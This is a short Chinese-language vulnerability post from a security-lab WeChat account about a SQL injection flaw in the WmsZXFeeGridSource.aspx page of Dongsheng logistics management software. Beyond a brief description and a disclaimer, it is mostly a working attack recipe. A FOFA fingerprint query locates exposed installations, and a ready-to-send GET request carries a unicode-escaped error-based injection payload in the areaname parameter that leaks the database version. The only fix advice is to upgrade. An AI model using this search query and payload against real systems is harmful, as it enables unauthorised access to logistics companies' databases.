> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzk5MDYxODcwMA==&mid=2247483934&idx=1&sn=d5857143ae8cc3a4efc5a0e53ced58cf

#  东胜物流软件 WmsZXFeeGridSource.aspx SQL注入漏洞  
原创 zz  星络安全实验室   2025-07-19 05:17  
  
<table><tbody><tr><td data-colwidth="576"><span style="color: rgba(0, 0, 0, 0.9);font-family: &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;font-style: normal;font-variant-ligatures: normal;font-variant-caps: normal;font-weight: 400;letter-spacing: 0.544px;orphans: 2;text-align: justify;text-indent: 0px;text-transform: none;widows: 2;word-spacing: 0px;-webkit-text-stroke-width: 0px;background-color: rgb(255, 255, 255);text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;display: inline !important;float: none;" data-pm-slice="0 0 []"><span leaf="">免责声明:文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，未授权的攻击属于非法行为!文章中敏感信息均已做多层打码处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责作者不为此承担任何责任，一旦造成后果请自行负责</span></span></td></tr></tbody></table>  
漏洞详情：  
  
东胜物流软件是青岛东胜伟业软件有限公司一款集订单管理、仓库管理、运输管理等多种功能于一体的物流管理软件。东胜物流信息管理系统 WmsZXFeeGridSource.aspx 存在SQL注入漏洞，攻击者可以通过该漏洞获取数据库敏感信息  
  
漏洞复现：  
  
fofa：  

```
body=&#34;FeeCodes/CompanysAdapter.aspx&#34; || body=&#34;dhtmlxcombo_whp.js&#34; || body=&#34;dongshengsoft&#34; || body=&#34;theme/dhtmlxcombo.css&#34;
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/ZxIkWliazrVcHC6gPlDoibVcge7UXeAG0J8gC4CgOECQibqIgvno0fj90Ube33Vz1tAbcOTpJObKj8MWo3bSOibl1A/640?wx_fmt=png&from=appmsg "")  
  
poc：  
  

```
GET /WMS_ZX/WmsZXFeeGridSource.aspx?areaname=%20%20%20%20%5c%75%30%30%33%31%5c%75%30%30%32%37%5c%75%30%30%36%31%5c%75%30%30%36%65%5c%75%30%30%36%34%5c%75%30%30%32%30%5c%75%30%30%33%31%5c%75%30%30%33%63%5c%75%30%30%34%30%5c%75%30%30%34%30%5c%75%30%30%35%36%5c%75%30%30%34%35%5c%75%30%30%35%32%5c%75%30%30%35%33%5c%75%30%30%34%39%5c%75%30%30%34%66%5c%75%30%30%34%65%5c%75%30%30%32%64%5c%75%30%30%32%64%20%20%20%20&read=%20%20%20%20areaname%20%20%20%20 HTTP/1.1
Host: xx
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/ZxIkWliazrVcHC6gPlDoibVcge7UXeAG0JzTddqRKvicXlNZl7T4rEPDpxe3U17vXh5WZOsZfGPosaiaUs1OeRv7Jw/640?wx_fmt=png&from=appmsg "")  
  
修复建议：  
  
关注厂商动态，升级至安全版本  
  
  
